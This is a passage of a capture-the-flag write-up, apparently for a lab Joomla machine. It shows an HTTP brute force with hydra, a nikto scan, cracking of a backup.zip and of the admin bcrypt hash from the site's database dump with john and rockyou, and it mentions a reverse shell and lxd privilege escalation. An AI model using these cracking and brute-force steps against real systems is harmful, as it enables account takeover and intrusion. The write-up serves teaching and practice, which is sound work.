@@ -154,3 +154,96 @@ $ hydra -V -l joker -P /usr/share/wordlists/rockyou.txt -f 10.10.92.30 -s 8080 h
 At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
 
 Answer: hannah
+
+Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
+
+Answer:**/administrator/**
+
+
+We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?
+
+```
+┌──(guts㉿TORFF)-[~]
+└─$ nikto -h http://10.10.92.30:8080/ -id joker:hannah  
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.92.30
++ Target Hostname:    10.10.92.30
++ Target Port:        8080
++ Start Time:         2025-07-18 21:15:13 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ / - Requires Authentication for realm ' Please enter the password.'
++ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+
+
+hannah
++ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/bin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/libraries/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 14 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+```
+Answer: **backup.zip**
+
+So i used john the riper to get backup password:
+```
+$ zip2john backup.zip >joker.hash
+
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt joker.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hannah           (backup.zip)  
+```
+We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?
+
+Answer: **hannah**
+
+Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?
+```
+└─$ grep "Super Duper User" joomladb.sql
+INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
+```
+I searched for `super duper user` because i saw it in source of main page port 8080
+
+Answer: **admin**
+
+Super Duper User! What is the password?
+```
+└─$ echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG'>hash.txt
+                                                                                                                     
+┌──(guts㉿TORFF)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --show
+Invalid options combination: "--show"
+                                                                                                                     
+┌──(guts㉿TORFF)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt       
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcd1234         (?)     
+1g 0:00:00:05 DONE (2025-07-18 21:34) 0.1984g/s 214.2p/s 214.2c/s 214.2C/s bullshit..brownie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+Answer: **abcd1234**
+
+
+After i found admins pssword i used reeverse shell to get into server, but i stacked with new problem, and It's lxd privESC
